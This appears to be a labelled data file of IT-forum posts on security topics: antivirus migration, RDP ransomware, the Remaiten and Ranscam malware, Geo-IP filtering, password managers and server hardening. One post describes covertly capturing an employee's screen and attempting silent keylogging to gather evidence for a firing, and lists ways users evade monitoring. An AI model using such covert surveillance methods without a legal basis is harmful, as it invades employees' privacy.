1618572,Anti virus Migration -- Trend to Symantec Endpoint,"Good Afternoon All,I recently have absorbed some duties of our newly departed Sys Admin so take this with a grain of salt as I probably not have all the info but I will do my best.My org is currently in the midst of migrating from Trend AV to Symantec Endpoint Protection.  I need to make this as smooth as a transition as possible, basically we have an AV server where Trend resides and about 1200 +﻿/- clients.  My boss would like to to keep trend running until Symantec is fully live (as in deploy clients) in addition he would like to see if we can install the SEPM alongside Trends manager (i dont believe so) to help facilitate the above statement.  I was thinking I could spin up a VM 2012 box and a few workstations to test what I needed to test ... Uninstall/deploy procedure and how we can mix that into our environment.  But on paper it looks like I will never have a problem, although sometimes it does and sometimes it doesnt.Basically I can see documentation and talk to engineers that everything can and will be hunky dory on a migration like this.  But does anyone have any relatable experience they can offer in regards to this, our sys admin has gone and I don't have many people to leverage outside of Symantec for honest stories or opinions.  ",0
2164868,Unsecure RDP Connections are a Widespread Security Failure," Tyler Moffitt, Senior Threat Research Analyst at Webroot, shared his thoughts on the vulnerabilities with unsecured RDP connections.   While ransomware, last year’s dominant threat, has taken a backseat to cryptomining attacks in 2018, it has by no means disappeared. Instead, ransomware has become a more targeted business model for cybercriminals, with unsecured remote desktop protocol (RDP) connections becoming the favorite port of entry for ransomware campaigns.RDP connections first gained popularity as attack vectors back in 2016, and early success has translated into further adoption by cybercriminals. The SamSam ransomware group has made millions of dollars by exploiting the RDP attack vector, earning the group headlines when they shut down government sectors of Atlanta and Colorado, along with the medical testing giant LabCorp this year.Think of unsecure RDP like the thermal exhaust port on the Death Star—an unfortunate security gap that can quickly lead to catastrophe if properly exploited. Organizations are inadequately setting up remote desktop solutions, leaving their environment wide open for criminals to penetrate with brute force tools. Cybercriminals can easily find and target these organizations by scanning for open RPD connections using engines like Shodan. Even lesser-skilled criminals can simply buy RDP access to already-hacked machines on the dark web.Once a criminal has desktop access to a corporate computer or server, it’s essentially game over from a security standpoint. An attacker with access can then easily disable endpoint protection or leverage exploits to verify their malicious payloads will execute. There are a variety of payload options available to the criminal for extracting profit from the victim as well.Common RDP-enabled threatsRansomware is the most obvious choice, since it’s business model is proven and allows the perpetrator to “case the joint” by browsing all data on system or shared drives to determine how valuable it is and, by extension, how large of a ransom can be requested.Cryptominers are another payload option, emerging more recently, criminals use via the RDP attack vector. When criminals breach a system, they can see all hardware installed and, if substantial CPU and GPU hardware are available, they can use it mine cryptocurrencies such as Monero on the hardware. This often leads to instant profitability that doesn’t require any payment action from the victim, and can therefore go by undetected indefinitely.Solving the RDP ProblemThe underlying problem that opens up RDP to exploitation is poor education. If more IT professionals were aware of this attack vector (and the severity of damage it could lead to), the proper precautions could be followed to secure the gap. Beyond the tips mentioned in my tweet above, one of the best solutions we recommend is simply restricting RDP to a whitelisted IP range.However, the reality is that too many IT departments are leaving default ports open, maintaining lax password policies, or not training their employees on how to avoid phishing attacks that could compromise their system’s credentials. Security awareness education should be paramount as employees are often the weakest link, but can also be a powerful defense in preventing your organization from compromise.You can learn more about the benefits of security awareness training in IT security here.",12

1529110,Meet Remaiten – a Linux bot on steroids targeting routers and potentially other,"The IRC-controlled malware known as Linux/Kaiten has returned. Today, our researchers announced they’ve identified three new, stronger versions of the malware -which they dubbed Linux/Remaiten. The main feature of the malware is an improved spreading mechanism. Based primarily on Linux/Gafgyt’s telnet scanning, Remaiten improves on the spreading mechanism by carrying downloader executable binaries for embedded platforms such as routers and other connected (IoT) devices. As seen in Linux/Moose, when the malware is executed, it also creates another bot for the malicious operators to use. This strain of malware also has a message that seems to single out malwaremustdie.org which published extensive details about Gafgyt, Tsunami and other members of this family of Malware.﻿Additional details about Remaiten can be found in a technical article by malware researchers Michal Malik & Marc-Etienne M.Léveillé﻿ on ESET’s official security blog: http://www.welivesecurity.com/2016/03/30/meet-remaiten-a-linux-bot-on-steroids-targeting-routers-and...",5

1993132,Security Issues with Employee Taking Laptop Home - How do you do it?,We are a utility that turns meters on and off now from the office.  For after hrs issues lets say a customer was disconnected for non-payment and wants to pay and be reconnected.  In order for our employee to take payment and then use our AMI system to turn the meters on and off from their house we will have to give them a laptop with VPN connectivity in order to do so.  What I mentioned above is pretty normal for a lot of businesses for their employees that work from home and/or in remote offices.  But in this case I am talking about the bottom 10% of employees that I would trust about as far as I could throw them with doing nothing but what was mentioned above with the laptop they were issued.  My fear is that they take this laptop home and they do something to get this machine infected.  Then some guy in another country has the access to access our customer billing information as well as remotely turn meters on and off.  I have pushed this fact to no end to my boss who is insistent that he doesn't care of the risks.So my real question is:  Knowing that they are going to have to VPN back into the office in order to reach the 2 servers that handle these 2 operations how do I lock the laptop down so that nothing else is able to be done on this laptop?  1 program uses a web interface (that only works through internet explorer) to turn meters on and off and the other actually uses some form of internet explorer as the platform for running the software even though there is no web address or internet explorer pulled up.  It has its own GUI but internet explorer settings have to be tweaked on install in order for the program to function and it clears the internet explorer cache at every initial start of the software.  I think I would want to kill all other possible traffic on the laptop.  I would want to stop any access to any other part of our network that this vpn connection would give them.  I wouldn't want some software that managed to get on this laptop to be able to penetrate anything back through our network and cause me IT problems that I would have to deal with.  ,0

Better to just start nuking files and then present victims with a ransom note. It's called RanScam and above is how it looks:Ranscam deceives victims by falsely claiming that files have been moved onto an hidden, encrypted partition. However, back at the ranch, this malicious code has deleted selected files and seriously messed with system settings like removing executables that drive System Restore, deleting shadow copies, and breaking Safe Mode etc. Recovering a system from this infection is very hard. This is outright destructive code and the way to recover is wipe and rebuild from bare metal.They try to extort a ransom of 0.2 Bitcoin (about $125) the crooks really have no mechanism at all to restore compromised files. The attackers provided the same wallet address for all payments and for all samples, said Cisco's Talos researchers.They said: “The lack of any encryption (and decryption) within this malware suggests this adversary is looking to ‘make a quick buck’ - it is not sophisticated in anyway and lacks functionality which is associated with other ransomware such asCryptowall.”The malware features a fake payment verification process that automatically returns notices of failure, possibly in the hopes that desperate victims might make a fresh payment. There is no longer honor amongst thieves. Currently the Ranscam campaign does not appear to be widespread and there have been no large-scale email spam campaigns...yet.Ransomware Hostage Rescue ManualGet the most complete Ransomware Manual packed with actionable info that you need to have to prevent infections, and what to do when you are hit with ransomware.https://info.knowbe4.com/ransomware-hostage-rescue-manual-0﻿Warm regards, Stu ",11

1207388,Using Spiceworks to dumb down the cost of security auditing,"When I was first hired on as the IT Manager here, I soon realized that I stepped back in time from my previous jobs.  Our only version of a helpdesk system was ""Hey you!!"" as we walked down the halls.  And if I had a really ambitus support person, he carried a notebook with him to write down what someone needed.  That's when I first came across Spiceworks.  Helpdesk, asset inventory, and reporting all in one.  And the price, no one could argue with that.  Now fast forward 7 years and we are now walking the same path with security auditing and tracking.  When my company first began its long journey to get their security certifications, (we are currently at PCI, HIPPA, SSAE 16) we started looking at a solution to handle some of the different requirements given to us.  The first being an IT/DEV Change Control System.  When our CEO saw the price tag associated with some of these systems I soon realize I should have presented this along with a box of tissues.  It wasn't long before we realized that one by one each new software requirement just added more and more to the budget.  That's when I remembered a similar fight, so many years ago, on getting a helpdesk system in place.  Now here we were looking at the possibility of using Spiceworks to do one more thing I couldn't spend money to do.  I knew I had to think this through and put a solid solution in place as the PCI audits weren't a joke.  It was hard enough understanding all the requirements, but to build a brand new solution on top of restructuring how everyone in the company looked at security and tracking.  I have a beginner’s level background in PHP.  I knew how Spiceworks worked.  So with a little (wait, make that a lot) of googling and a small web server I was able to setup a new Change Control system.  This is how it works.A new ticket comes into Spiceworks requesting something that will require an attached Change control.  From this ticket I now have a ticket number and the details of what is needed, as well as the person requesting, priority, etc...  I created a small PHP webpage that allows my team to go to this page and fill out a form that asks for the originating ticket number, description, details, date/time, impact to production, is a CRC required (Change control review committee), what's the rollback, verification, who submitted, approver, and implemented by.  Once submitted, an email is generated and sent to Spiceworks with a specific subject line, so that when Spiceworks receives the email it will create the ticket, and using the specific subject line and ""My Ticket Rules"", automatically changes the category to ""Change Control (Requires Approval)"".  Because I have the originating ticket number I can now use the phrase  [Ticket #xxxxx] in the PHP page generated email and it creates a link to the originating ticket in the Change Control.  I also have all details required for every Change Control that match between originating ticket and Change Control itself.  First off, to keep the ticket and change control together, we go in and attached the originating ticket as a sub ticket to the change control. (I can't wait until Spiceworks Anywhere begins to allow the attachment of a sub ticket as I can then do this step automatically in the php generated email).   Once the change control is reviewed, it is updated as approved and the category is manually changed to ""Change Control (Approved)"" and assigned to a technician with a due date / time to be implement.  That technical can then make necessary changes and close the Change Control.Now, during our yearly audits they always review change control processes.  They will ask for 5 - 10 change controls and the associated request.  I can run a report for the category ""Change Control (Approved)"" and from there provide the auditor with everything they need including associated tickets. This is just one example of how we've used Spiceworks to consolidate our security requirements into a single system.  I have many other examples that we've implemented such as building an onboarding/off boarding process with the use of a PHP page form that generates an email for Spiceworks and PowerShell scripts to allow HR to streamline, track, and always ensure all required information is submitted with every request.  It also creates the new user (disabled) and updates Name, address, department, manager, etc... inside Spiceworks, active directory, and the ticket itself.  All this goes to prove that with a product such as Spiceworks, a little time, a lot of determination, and sometimes a little luck, there are places you can save headache, money, and even a few tissues by looking at what you have, and not what you think you need.  Thank you Spiceworks!﻿",12

2074284,What are your Geo-IP Filtering Best Practices?,"2017 has proven to be a hectic year overall with my personal experiences of recovering and dealing with Ransomware and brute-forcing attacks. In just 2017 alone, I've seen and recovered from more Ransomware than I have from 2014, 2015, and 2016 combined. While that's ""good"" for our pockets, I'd rather not be recovering from attacks, and spend more time preventing and mitigating disasters.Sure, I have to admit that I've moved and changed companies three times in the past two years, so maybe my incident count could be less given my employer's market strategy (currently working for a MSP) - and one of these incidents is from a customer who said ""No, security training doesn't really apply to us. We're good."" and simply failed to show up for a training seminar we hosted that included lunch and some mentions of using KnowBe4 (which we all love). We would have had to drag them to the training if we tried any harder!The infection hit them less than 30 days following this. And not only that, but they were hit twice more after we recovered them the first time! The second and third infections were even contested after we billed them stating ""We already paid for this"" when actually, it was three separate instances of ransomware, invoked by three different employees, at a less-than-ten-person office.Now my company is really ramping up our network security offerings in a number of ways, and we're beginning to have more meetings and discussions with our clients- many of which are in the education, financial, and health sectors. Not only are their systems mission-critical, but their end users are notoriously awful at data security and privacy practices.That being said- one thing we're offering is enforcing Geo-IP Filtering on all SonicWALL products in the field. At this time, we have over 30 SonicWALLs that are capable of using Geo-IP Filtering, and I'd like to turn it on for every one of them. ""But why"" You ask? Even when previous Spiceworks discussions have yielded posts stating ""it's not helpful"" - I beg to differ. Let me explain:In the past 30 days, one of our customers has experienced 775,000 brute-forcing attempts against ONE system that they refuse to either A: Close off from the outside world, or B: adhere to 2-Factor authentication services for all remote logins. Of these 775,000 brute-force attempts, over 600,000 of them have originated from Botnet systems located in the top ~15 countries listed by both Symantec and Spamhaus as having the highest volume of known Botnet servers. Most of these are in Europe. While I don't endorse Symantec for their antivirus, I do think that they probably have the largest and most prevalent global presence in terms of their software and endpoint visibility- so I trust their metrics.By simply employing Geo-IP filtering to the ""top 15"" list I procured by combining sources from Spamhaus and Symantec reports, I've effectively reduced brute forcing attempts by anywhere from 60% to 80% - and all I had to do was enable a handful of check-boxes.""But isn't that what Botnet filtering is for?"" - well, sort of. But just because there's a Botnet Filter option in the SonicWALL doesn't mean it catches everyone. That's just the IP addresses that are known to be botnet hosts. Much like ""antivirus definitions"" it is simply a list of known threats and ways to shut them down via denial of network access. If Russia has over 420,000 known bots- how many more might there be? I'll tell you one thing- I don't want to know, but if I don't visit Russian websites or direct my traffic there for a darn good reason, I'd rather block the country and simply allow single sites or hosts through on an as-needed basis.It's always easy to point fingers, shrug something off, or simply scroll past these advanced security features- but after recovering from my seventh Ransomware incident this year, and seeing the actual count of loopholes, backdoors, injections for IIS, SQL, and Apache- I have to say that Network Security really is a super-serious thing. What might look like a three or four-figure number to a CFO today whom is proficiently penny pinching could turn into a five or six figure number overnight for a recovery. In fact, many companies process transactions in excess of the cost of a top-of-the-line hardware appliance and yearly renewal costs on a weekly basis. The real trick is making analogies or explaining in non-technical terms so the real cost makes sense to them. That much is up to the Sales department, but I have to translate it to them first.That's our next hurdle: Being able to deliver best-in-class protection at a cost that is somehow still profitable for a myriad of clients from Non-Profits who are being constantly cut short on their funding to financial advisors who have 3 offices but live on a yacht.What other Geo-IP Filtering and Botnet security measures do you employ? Is there something I missed? I'd love to hear your feedback, whatever it is!Sources mentioned above:https://www.spamhaus.org/statistics/botnet-cc/https://uk.norton.com/tools/bots/index.html",0

These are their answers:  Interview: Jimmy PeckTell us a bit about the business you work for (Lassens Natural Foods and Vitamins)Small grocery chainWhat do you use for password management?KeePass v2How many users do you have using the password management system?150+What other options did you consider?- Notepad- Excel- No managementWhat are the pros and cons of the solution you chose?- Encrypted (pro)- Meant for single user (pro)- Users can change passwords without updating the system (con)- Sync Issues (con)These are in regards to emails and online accounts. Our local computers use a generic naming convention, to which a password can be derived from the name of the user on the computer. With so many users in and out of stations we needed something simple enough for people to remember, but safe enough to have computers out and about the store.  Interview: ShoufimafiTell us a bit about the business you work forWe build and sell servers for movie theaters.What do you use for password management?I use LastPass my manager uses a local encrypted password fileHow many users do you have using the password management system??3-4 out of 125 employess. I would like to use lastpass enterprise company-wide... but it's too expensive as a monthly feeWhat other options did you consider?Local encrypted password utilites like password bank, password protected excel sheets, mobile password appsWhat are the pros and cons of the solution you chose?Pros: Cloud based, two-factor authentication, auto-login to sites, generated passwords that are readable, you can delegate access to someone's lastpass account without them being able to view the password!Cons: mobile app for last pass requires monthly feeInterview: TexkoncTell us a bit about the business you work forThe business I work for is very diversified. We have many divisions that need password management and as we have grown there need to be a common password that a team needs to share, so you have to lock that up.What do you use for password management?We have been using Password Safe. It works out really well for us as a team. I use LastPass personally so I have my passwords with me anywhere via a browser.  We have the app setup for many other divisions of the company and everyone seems to like it.How many users do you have using the password management system?Split between the departments that use it, we have about 35 user of safes.What other options did you consider?This was already in place when I arrived at the company and it works very well for us, so I do not see a big need to change.What are the pros and cons of the solution you chose?The obvious pro is that you can keep all your passwords in one place so you wont have to remember them. We burn brain cells every day, so being in IT and trying to remember all that junk just gets overwhelming. The Pro for me using LastPass is that I can log onto their site from anywhere and find any of the randomly generated passwords. I personally randomly generate a password in massive length for most every site. Will be hard to guess the password for the sites that I am on.The downside, you have to remember your encryption key or you are screwed. The other downside is if you get hit with a infection and they can try and brute force their way in.  That is why it is always recommended to change your key randomly and make sure it is still strong enough to deter a brute force attack for a while, but still something you can remember.Interview: DarienATell us a bit about the business you work for (Rapid AdvanceI work for a financial lending institution.What do you use for password management?A combination of LastPass and a password protected excel spreadsheet on a restricted share on a server with restricted access.How many users do you have using the password management system?2 folksWhat other options did you consider?I continue to think about moving to an actual program/web GUI system but just haven’t found the time to do any research in to those products, and with the small number of folks accessing the passwords it hasn't become a huge issue.What are the pros and cons of the solution you chose?Pros: LastPass is accessible through any web browser, or via cached credentials pre-installed on my smartphone/tablet. Cons: There’s always a security risk when you move to a outsourced service for housing your secure credentials. Though except one public issue a bit back LastPass has a good track record IMO.  Now that you've had a peek behind the curtain at these SpiceHeads' networks, please jump in and share your password management choice.  What are you using for password management and why? You can start by answering the same questions they did: Tell us a bit about the business you work forWhat do you use for password management?How many users do you have using the password management system?What other options did you consider?What are the pros and cons of the solution you chose?We have a new Product Selector for Password Management. If you are using or have trialed a password management solution, please take a moment and write reviews on the relevant products.  If you are shopping for a solution, then you can use this list to help you evaluate your options.  ",0

I suggest you send the following short alert to as many people as you can.[ALERT] ""Lowlife internet scum is trying to benefit from the Orlando shootings. They are now sending out phishing campaigns that try to trick you into clicking on a variety of links about blood drives, charitable donations, ""inside"" information or ""exclusive"" videos. Don't let them shock you into clicking on anything, or open possibly dangerous attachments you did not ask for! Anything you receive about the Orlando shootings, be very suspicious. With this topic, think three times before you click. It is very possible that it is a scam, even though it might look legit or was forwarded to you by a friend -- be especially careful when it seems to come from someone you know through email, a text or social media postings because their account may be hacked.  In case you want to donate to charity, go to your usual charity by typing their name in the address bar of your browser and do not click on a link in any email. Remember, these precautions are just as important at the house as in the office, and tell your family.""It is unfortunate that we continue to have to warn against the bad guys on the internet that use these tragedies for their own benefit.

273404,Spy games: User trust and surveillance,"This is the 132nd article in the Spotlight on IT series. If you'd be interested in writing an article on the subject of backup, security, storage, virtualization, mobile, networking, wireless, DNS, MSPs or printers for the series PM Eric to get started.Security systems and information products are becoming more difficult to crack as developers pay more attention to security, and as a result the human element becomes the prime target for attackers. End users are the most vulnerable element in information security, as they likely lack formal training and their knowledge of security often boils down to antivirus installed by a PC vendor. Yet, the end user is also the most unavoidable element of the entire process.Somewhere in there lies the trust between you (and effectively your employer) and the user. Face it, not everyone can be a security expert, and even training doesn't guarantee that users will follow the guidelines. You have to trust them. But what if they violate that trust? What do you do? Do you report them to the employer? How do you prove they’re at fault?I recently ended up in a scenario like this. I was asked by my boss to provide web activity logs and spy on a user. My employer happened to walk by said user's desk and saw him browsing the web instead of doing his job.The problem was, until recently, my company didn’t have a written policy for allowed web usage — or any IT policy for that matter. I knew that without a policy in place, any security measures were pointless, so I wrote a complete IT assets usage policy. Rather than enforcing certain restrictions, my boss granted users reasonable usage allowance, trusting they wouldn’t cross the line.Having a policy in place, I had the power to do all that the boss asked me to. I checked the logs from the proxy server and that user’s web activity. Instantly, I knew it wasn't going to help anybody. The web has changed; it's no longer a single ""index.html"" file. Each page visit produces tens to sometimes over a hundred requests to the web server. For example, http://community.spiceworks.com yields anywhere from 75 to 80 requests — more if you keep scrolling the page — from different subdomains, ads, stat-collection scripts, CDN, etc. It's a real mess, and it's hard to read, especially for a non-technical, high-level executive.My boss asked me to print the user’s activity last month, and it turned out to be 23 pages. I knew that for my boss it would be enough to fire that employee, but I also knew he might be making a mistake and risking a potential lawsuit. I explained to him that what he had on paper wasn't conclusive at all and that the entire activity could be generated in probably 2 or 3 hours. I had to get hard proof that the user was violating company policy.I started with keyloggers, but none of them could be easily deployed silently. They required antivirus exclusions and open ports in the firewall. Some would crash if not running with local administrator privileges, and some wouldn’t run at all if not launched locally. So basically, I would have to ask the user to set the keylogger so I could spy on him. Brilliant...I had a previous experience with keyloggers from my college days, so I knew it was possible, but I was running against the clock and decided to search for different solutions. I knew I had to get either complete keystroke activity or screenshots from the user’s desktop. That’s when I ran across Boztek VNCScan, a tool to remotely manage desktops that happens to allow remote screen capture. Bingo!I started collecting screenshots, and the following day I had clear proof of what the user was doing. To my surprise, he knew about privacy mode in Firefox, so it was obvious he was trying to cover his tracks. Here are some most popular ways for users to try to bypass security measures:Privacy mode in browsersAnonymous proxy, such as ninjacloak.comVPN or SSH tunnelsThe screenshots were all the evidence my boss was looking for, and the user lost his job shortly after that.To summarize, what do you do when someone violates the trust relationship and you are asked to spy them?CYA. I cannot stress this enough: Have a written policy in place that covers monitoring and users should not expect any privacy while using the company's assets. Then, run it through your HR department and then through your lawyers. Or better yet, have your lawyers write it. In my case, we gave the users some freedom with web usage, but we explicitly stated all activity is monitored and what's allowed and what's not. Without the policy, you may be setting yourself up for a lawsuit, and that’s never a pleasant experience.Start with web activity reports, but don't trust the results. They will most likely be inaccurate, and provide false information that can sink a completely innocent user unless you own a system that can filter through all the requests and just report the single destination URL. These types of report tools cannot report time spent on web pages; the only thing that can be logged is time spent downloading web resources. I use pfSense with Squid proxy, Squidguard, and Lightsquid reporting tool. Lightsquid can also show real-time activity, but it's not really practical unless you have time to sit and watch it for hours. Another reporting tool available for pfSense is SARG. Other popular firewall/proxy systems are Untangle and Smoothwall. You are also free to build one yourself on top of favorite Linux or BSD flavor. Note: This is ineffective against proxy servers and tunnels. While you can block anonymous proxy servers, tunnels present bigger problems.Log keystrokes or capture screenshots. Like I said before, web activity reports are not conclusive, may be inaccurate and may not produce reliable results. Keylogging software often has the capability to take screenshots, and this is what you ultimately want. You also have to be extremely careful when using any type of keylogger — whether it's software or hardware — as storing sensitive information, such as user's private email, banking or medical login details, could get you in trouble even if you have a policy to cover that. I’m not a lawyer and laws vary from country to country and state to state, so please consult an experienced attorney before using keyloggers. That's why I opted for screenshots, as it's impossible in most cases to obtain a user’s passwords that way. It was also the only way to keep tabs on users that managed to set up VPN or SSH tunnels to bypass proxy.Install a high-resolution surveillance camera :) This is rather extreme and may be too obvious, but if none of the above are possible for whatever reason, this could be your only option. Just make sure you position it correctly so it doesn't record users’ backs instead of the screen. Once in place, this will make users think twice next time they want to do something unethical or stupid. I’ll be installing a camera shortly to monitor one of our copiers.Bruce Schneier said, ""Security is not a product, it's a process."" Security is not just a technology problem, it's people's problem.

1533091,US and Canada come together to warn against ransomware,"In response to the uptick in ransomware attacks, the United States and Canada have released a joint cyber alert to promote awareness about the malware and give advice on how to avoid it. According to ZDNet, ""The warning follows reports from several private security firms that they expect the crisis to worsen because hackers are getting more sophisticated and few businesses have adopted proper security measures to thwart such attacks."" In its alert﻿, the US and Canada warned that ransomware infections ""can be devastating to an individual or organization, and recovery can be a difficult process that may require the services of a reputable data recovery specialist."" Warning that ransomware attacks ""include the loss of sensitive or proprietary information, disruption of regular operations, expenses to restore access to computer systems, and harm to a victim's reputation,"" the US and Canadian governments advised against paying ransoms. Such an act does ""not guarantee the encrypted files will be releases... [but rather] guarantees that the malicious actors receive the victim's money and, in some cases, their banking information."" This joint alert follows a private warning from the Federal Bureau of Investigation (FBI) last week in which it warned businesses of the attacks and issued a call for private sector help in determining where the attacks are coming from. ﻿Earlier this week, the security company Bitdefender released a free tool that prevents against the CTB-Locker, TeslaCrypt, and Locky ransomware variants on Windows computers. ",11

1058375,4 server security measures before setting up infrastructure,"When you're setting up a server, it's easy to get caught up in just getting it to work. Whether that your end goal is supporting apps, email, your developers, or whatever else you may be up to, System Administrator Desk wants you to focus on security first and foremost. Setting up your infrastructure should, in other words, come after you've made sure you've covered your security bases. Just like in baseball, System Administration Desk calls attention to four basic bases: SSH keys, firewalls, service auditing, and intrusion detection systems and file auditing. ﻿1. SSH keys ﻿""SSH keys are cryptographic﻿ key pairs that can be used to authenticate to an SSH server as an alternative to password-based login."" Once you've created your SSH keys, System Administration Desk continues, ﻿you'll need to place the public key in a special directory. Whenever your users ""try to connect with the server, the server will ask for proof (SSH key)."" If you've never before configured SSH keys, Digital Ocean provides a full tutorial on everything you need to know. 2. Firewalls ﻿Firewalls are any ""piece of software or hardware that control what services are exposed to the network."" On any given server, you'll have certain services and programs running by default. These can be reduced to three basic categories: public, private, and internal. In this way, a firewall keeps everyone where they're supposed to be based on their categorization. System Administration Desk recommends UFW Firewall, iptables, and CSF Firewall. ﻿3. Service auditing Analyzing your servers is a crucial step in ""understanding the available attack surfaces, and locking down the components as best you can."" The process is simple enough: Keep track of what services are running, what ports are being used, and what protocols your server's accepting. All of this goes a long way to helping you figure out how to best configure your firewall. 4. Intrusion detection systems and file auditing ﻿The last part has two steps: File auditing involves comparing an image of your system when you know it was in a good state to its present state so you can examine authorization changes, while an intrusion detection system monitors your ""system or network for unauthorized activity."" Two popular intrusion detection system monitors are Tripwire and Aide. Are there any other steps and tools you'd add to System Administrator Desk's list?",11

To me, the key point is this, regarding AI, behavioral, and machine learning technology (which many refer to as ""next-gen""):""...it’s important to know that companies like Avast and AVG, which we recently acquired, have been using these same technologies for years, quietly and successfully, to protect our users.""There's a little rant in there about buzzwords, too :) (I know I am guilty of using them from time to time, I'm trying to do better!)If you're looking to learn more about how Avast leverages both human and machine, both AI and big data, to protect our users -- this is a great place to get an inside look from the heart of Avast.https://blog.avast.com/fighting-new-wave-cybercrime-next-gen-cybersecurity",0

1981026,"Ransomware targeting ""the little guys"" more frequently?","I know this isn't a happy article to post on a Monday... it suits the gloomy, grey weather from where I sit right now -- but it's something we all need to know. Or, already know.Smaller businesses are being targeted by ransomware more than ever, according to researchers. One stated that ransomware attacks against companies with 200 or fewer employees is poised to triple or even quadruple what was seen in 2015.The quote from the article that really stuck with me: ""Small businesses are frequently a more appealing target for ransomware because they sit at the juncture of money and vulnerability”It's the same old song for many of us, but the moral of the story is that SMB needs security layers, ransomware protection, and user education now more than ever before. The criminals realize that too many smaller companies, perhaps, aren't budgeting for security or simply shrug it off... because the attacks keep coming.More interesting stats on the Parallax, it's a worthwhile read:https://www.the-parallax.com/2017/04/03/ransomware-small-businesses-consumers/",0
220580,WebSense Rant,"I began researching the upgrade process over a month ago. I followed all the steps in the (poorly written, error strewn) documentation. It's been a nightmare of an ordeal.Finally get it upgraded and running. It ran for about a week. Then services started failing.Tried every trick in the book to get it working. No luck. Re-installed. Lost all the custom settings. But I backed them up (so I thought). Tried re-importing the settings that I backed up. It crashes the new install. Tried uninstalling and re-installing at least 3 times now in the last week. Each time it went differently. Had to use ccleaner to clear out some services that remained after one of the uninstalls.So I'm back to square one again. I think I have the backup files I need, so I'm not too worried about it. Just try again, right?Nope.I just found out that WebSense's terrible documentation for backing up files prior to the upgrade totally skips the part about saving your custom policies. Even if you follow every step in the instructions for upgrading and backing up files, you will still LOSE all of your custom policies!In the Section ""Preparing for Upgrade"" under the heading ""Backing up Files"", they have you back up some mysterious configuration files using the wsbackup command. They actually refer to it as a ""Full System Backup"" and this will help provide ""minimal downtime"". It's been down for a week. And guess what! They don't bother telling you how to back up your policies! Apparently the command for backing up policies is completely different (pgsetup). Not only did my mysterious configuration backup somehow get corrupted (it crashes my entire WebSense infrastructure every time I import it-3 times now), I didn't even back up the policies because that's not in the documentation!HOLY COW.I've spent countless hours on this only to find out that I don't even have a backup of my policies. I feel like WebSense owes my company for the time and money lost on this nightmare.I will never again use such a terrible product if given the choice!!And simple tasks, like setting up the security certificate? Good luck. It was like pulling teeth trying to get the next step. Yeah they have documentation for that too, but if you actually read through it, you'll find plenty of errors there too. Literally every step of the process has been like this.-Oh and I just got  this reply from their tech (bold added for effect):    Yes, It does not seem to be mentioned in the upgrade instructions. I have mentioned this to our KB team and they informed me it would be updated. I have not heard back from them since.That's right, a crucial part of the process is not included in the official documentation.You got me this time, WebSense!",11
1030875,Don't focus on malware and ignore bigger threats,"Dark Reading columnist Giora Engel says that an overzealous focus on malware may be preventing you from detecting even bigger threats.﻿ Malware is bad, of course, but a security breach may be worse – and one does not imply the other. Engel points out that ""a successful targeted data breach is an iterative process in which the attacker bypasses prevention technologies.﻿"" Therefore, you need to be able to detect intrusions if your malware detection proves inadequate. He advises organizations ""conduct ongoing behavioral analysis of computers and users rather than sandboxing and IOC (indicators of compromise) detection. Sandboxing is simply malware detection, and IOCs are simply signatures of known malware.""﻿In addition, ""if a security professional actually discovers suspicious behavior, simply removing malware or re-imaging a machine won’t achieve a lot.﻿"" You may have found an artifact and missed an ongoing problem. The author says, ""Remediation should start with triage and investigation of the suspicious behavior. It needs to be based on both network context, which gives breadth and complete visibility, and also on the endpoint context, which provides the depth and root cause analysis.""If you've found malware and traced it to a bigger security breach, please share your tips and techniques.﻿",0
342306,Stonesoft Acquisition Differentiates McAfee,"One of the most important facts about McAfee’s pending acquisition of Stonesoft is that it empowers us with the ability to compete like never before in the enterprise firewall and data center areas. The next-generation firewall market within network security is an exciting segment because it’s rapidly growing – estimated to expand from $500 million in 2012 to $4.6 billion by 2016! With Intel’s involvement in the data center, this acquisition will allow McAfee enterprise to leverage our parent company at previously unseen levels and to offer our customers smooth product integration. A recent study from NSS Labs says, “Executed correctly, this strategy should allow McAfee to expand sales into the data center and network core (providing a serious challenge to date center incumbents), as well as tap into the fast growing NGFW market.” There’s no doubt, Stonesoft will help us suffocate the competition when it comes to NGFW.

949791,Replacement for KeePass?,"  To start off, myself and my team included have always loved keepass. As a company however we may have outgrown it. For those who don't know, KeePass is a free open source password manager, which helps you to manage your passwords in a secure way. You can put all your passwords in one database, which is locked with one master key or a key file.    We first came across Keepass as a solution to handle the storage of our many, many, many, passwords in the IT department. This worked extremely well for a very long time. As of now it has made its way into other departments and on a lot of our user’s computers. We see it as an efficiency practice. The more help users have in keeping and remembering their passwords the less tickets we might get for unlocks.   Our issue lies in the functionality of the program. It worked well when it was just IT but doesn’t fit when deployed to many users across the company. Our biggest issue is the inability to manage the software. There seems to be no way in which to create any complexity requirements for the master password or requirements on password expiration. From an administrative and security standpoint, this is a mess. This leaves us looking for a replacement. One of the best solutions I have seen so far is a program called LastPass. It looks to have everything we need but I was hoping to get some other spiceheads to weigh in on this. Does anybody know a way to make Keepass more manageable? Or does anyone know a good solution for password management software that will allow Configurable Policies? Does anyone use any of these solutions, what do you think of them?﻿﻿",0

Second solution that I want to implement in my configuration is to set up different public IP address for VPN Server and different for Nginx Server.Now I looking for solution how can I setup two different addresses for OPNsense and second address use for OpenVPN connection. In my case I need to configure this for one gateway, my ISP delivers me 1Gbps connection through fiber which is connected to SuperMicro RouterBOARD260GS (one SFP to 4x1G) and from one of four 1G ports to connect my OPNsense machine on one of my 255.255.255.224 netmask (pool of 30 public addresses). In this machine I have two NICs and I can separate WAN connection to two different NICs but I don't know how to set up this configuration because I saw tutorials for MultiWAN configuration only for HA or redundancy purposes by using two different IPS connections with two different gateways.eg. pfSense but it's similar configurationCould You help me with this problem, is there any hope to configure MultiWAN connection on same gateway and use one of this WAN for VPN only?Also in final version of my OPNsense machine I want to use SFP NICs, one for WAN connection and second for LAN connection but I have one fiber cable and can I pass multiple WAN addresses through one fiber cable/SFP port directly to my OPNsense machine or I have to use SFP gateway to separate addressese for different ports and then I can pass them to OPNsense?",0
197159,antivirus test,"I want to really test what antivirus/malware product to use. I’ve tried non32, McAfee, Norton, Panda,  eEye in the past but users have always managed to get infected My boss has tasked me to find a solution. So I’ve built a test hyper-v network with a virtual 7 machine I figure the first test would be to  infect the VM, but I haven’t been able to. I’ve downloaded file sharing stuff, I’ve downloaded toolbars, free anti-virus stuff. I’m trying to get the nasty fake anti-virus 2012, but it’s just not happening. I’ve been at this over a week now I tried the eicar.org test, but even a completely non secure machine wouldn’t fall for that Does anybody know a way to test? Thanks Vic ",5
